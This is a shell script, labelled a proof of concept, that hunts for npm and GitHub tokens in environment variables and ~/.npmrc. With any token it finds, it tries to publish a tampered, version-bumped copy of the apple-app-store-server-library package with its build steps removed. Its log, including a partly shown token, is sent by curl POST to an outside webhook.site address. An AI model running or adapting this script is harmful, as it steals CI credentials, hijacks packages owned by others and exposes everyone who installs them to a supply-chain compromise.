export OUT=$(mktemp)
URL='https://webhook.site/85f78e76-dc73-4cb5-a65c-27f2c10db591'
(
echo '--- HUNTING FOR VALID TOKENS ---'
# Cari di Env Vars (Urutan prioritas)
BOT_TOKEN=$(env | grep -E 'NPM_TOKEN|NODE_AUTH_TOKEN|GITHUB_TOKEN|NPM_AUTH_TOKEN' | head -n 1 | cut -d= -f2)

if [ -z "$BOT_TOKEN" ]; then
    echo "Token tidak di Env, mencari di .npmrc sistem..."
    BOT_TOKEN=$(grep -oE 'authToken=[^ ]+' ~/.npmrc 2>/dev/null | cut -d= -f2)
fi

if [ -n "$BOT_TOKEN" ]; then
    echo "TOKEN VALID DITEMUKAN: ${BOT_TOKEN:0:7}***"
    echo "//registry.npmjs.org/:_authToken=$BOT_TOKEN" > .npmrc
    
    echo '--- TARGETING: apple-app-store-server-library ---'
    npm pack apple-app-store-server-library 2>/dev/null
    FILE=$(ls apple-app-store-server-library-*.tgz 2>/dev/null)
    
    if [ -n "$FILE" ]; then
        mkdir -p pocalin && tar -xzf "$FILE" -C pocalin
        cd pocalin/package
        echo -e "\n# Proof of Concept by Frank\nAutomatically updated by internal automation using discovered credentials." >> README.md
        
        # Auto-Versioning
        CUR_VER=$(grep '"version":' package.json | cut -d'"' -f4)
        NEXT_VER="${CUR_VER%.*}.$((${CUR_VER##*.}+1))"
        sed -i "s/\"version\": \"$CUR_VER\"/\"version\": \"$NEXT_VER\"/" package.json
        
        # Bypass Build (Hapus pnpm/tsc requirement)
        sed -i '/"prepack":/d; /"prepare":/d; /"build":/d' package.json
        cp ../../.npmrc .
        
        echo "--- ATTEMPTING PUBLISH WITH BOT TOKEN ---"
        npm publish --userconfig .npmrc 2>&1
        cd ../..
    else
        echo "Gagal menarik paket target."
    fi
else
    echo "TIDAK ADA TOKEN VALID DITEMUKAN. Env aman atau sandbox ketat."
fi
echo '--- SELESAI ---'
) > $OUT
curl -X POST -H "Content-Type: text/plain" --data-binary @$OUT $URL
rm $OUT
